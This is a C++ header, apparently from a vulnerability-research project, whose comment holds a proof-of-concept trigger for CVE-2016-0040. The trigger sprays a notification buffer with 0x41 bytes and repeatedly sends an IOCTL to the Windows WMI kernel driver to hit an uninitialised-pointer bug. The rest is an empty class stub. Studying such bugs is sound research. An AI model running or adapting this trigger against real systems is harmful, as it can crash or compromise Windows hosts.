/*
.description
https://msrc.microsoft.com/blog/2017/06/tales-from-the-msrc-from-pixels-to-poc/
https://r00tkitsmm.github.io/fuzzing/2024/03/29/wmicuninitializedpointer.html

.poc
typedef union {
    HANDLE Handle;
    ULONG64 Handle64;
    ULONG32 Handle32;
}
HANDLE3264, * PHANDLE3264;

typedef struct {
    //
    // List of guid notification handles
    //
    ULONG HandleCount;
    ULONG Action;
    HANDLE  UserModeCallback; // PUSER_THREAD_START_ROUTINE
    HANDLE3264 UserModeProcess;
    HANDLE3264 Handles[20];
}
WMIRECEIVENOTIFICATION, * PWMIRECEIVENOTIFICATION;

#define RECEIVE_ACTION_CREATE_THREAD 2 // Mark guid objects as requiring

typedef struct {
    IN VOID* ObjectAttributes;
    IN ACCESS_MASK DesiredAccess;

    OUT HANDLE3264 Handle;
}
WMIOPENGUIDBLOCK, * PWMIOPENGUIDBLOCK;

#define IOCTL_WMI_ENUMERATE_GUIDS\
CTL_CODE(FILE_DEVICE_UNKNOWN, WmiEnumerateGuidList, METHOD_BUFFERED, FILE_READ_ACCESS)

void main() {
    DWORD dwBytesReturned;
    HANDLE threadhandle;
    WMIRECEIVENOTIFICATION buffer;
    CHAR OutPut[1000];

    memset(&amp; buffer, '\x41', sizeof(buffer)); // set ecx to 0x41414141
    buffer.HandleCount = 0;
    buffer.Action = RECEIVE_ACTION_CREATE_THREAD;
    buffer.UserModeProcess.Handle = GetCurrentProcess();

    // using NtMapUserPhysicalPages for spraying stack cant help us

    HANDLE hDriver = CreateFileA("\\\\.\\WMIDataDevice", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver != INVALID_HANDLE_VALUE) {
        while (TRUE) {
            if (!DeviceIoControl(hDriver, IOCTL_WMI_RECEIVE_NOTIFICATIONS, &amp; buffer, sizeof(buffer), &amp; OutPut, sizeof(OutPut), &amp; dwBytesReturned, NULL)) {
                return;
            }
        }

    }
}
*/

#pragma once
#include "log.hpp"
#include "common.hpp"

#define CONTROL_DATA 0x42
#define ALLOC_SIZE 0x80

namespace Vuln {
    namespace UninitializeMemory {

        class WMI_CVE_2016_0040 {

        };
    }
}
